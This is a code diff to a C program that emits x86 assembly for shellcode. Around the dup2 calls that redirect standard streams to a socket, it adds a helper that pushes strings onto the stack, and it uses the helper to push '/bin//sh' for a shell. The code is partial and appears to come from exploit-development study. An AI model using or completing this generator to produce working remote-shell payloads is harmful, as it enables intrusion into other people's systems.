@@ -41,7 +41,54 @@ static void build_syscall3(uint16_t syscall, uint32_t arg_ebx, uint32_t arg_ecx,
 static void build_syscall2(uint16_t syscall, uint32_t arg_ebx, uint32_t arg_ecx); 
 static void store_result(reg32_t result, reg32_t destination);
 static void build_sockaddr(uint32_t ipv4, uint16_t port, uint16_t family);
+static void build_stackstring(const char * text);
 
+static void build_stackstring(const char * text)
+{
+    size_t len = strlen(text);
+    size_t chunk = sizeof(uint32_t);    // 4 bytes per register
+    //size_t offset = 0;
+
+    if (0 == len)
+    {
+        // nothing to do
+        return;
+    }
+    else if ((len % 4) != 0)
+    {
+        fprintf(stderr, "[!] string length of %d not supported!\n"
+            "\t(Must be evenly divisible by 4.)\n", len);
+        return;
+    } 
+
+    dprintf(temp_fd, "\txor eax, eax\n"
+        "\tpush eax\t\t; NULL terminator\n\n");
+
+    
+    /* reverse the string for x86 Little Endianness */
+    char * reversed = calloc((len + 1), sizeof(char));
+    size_t i, j;
+    j = len - 1;
+    for (i = 0; i < len; i++)  
+    {
+        reversed[i] = text[j];
+        j--;
+    }  
+    //printf("[!] %s backwards is %s\n\n", text, reversed);
+    
+    for (size_t offset = 0; offset < len; offset += chunk)
+    {
+        uint32_t current;
+        memcpy(&current, &(reversed[offset]), chunk);
+        
+        store_in_reg(current, eax);
+        dprintf(temp_fd, "\tpush eax\t\t; %.*s\n\n",
+            4, &(reversed[offset]));        
+    }
+    
+
+    free(reversed);
+}
 
 static void build_sockaddr(uint32_t ipv4, uint16_t port, uint16_t family)
 {
@@ -343,6 +390,10 @@ int main(int argc, char * argv[])
     build_syscall2(SYS_dup2, SKIP_PARAM, STDIN_FILENO);
     build_syscall2(SYS_dup2, SKIP_PARAM, STDOUT_FILENO);
     build_syscall2(SYS_dup2, SKIP_PARAM, STDERR_FILENO);
+
+    build_stackstring("This will fail");
+
+    build_stackstring("/bin//sh");
 
     if (close(temp_fd))
     {
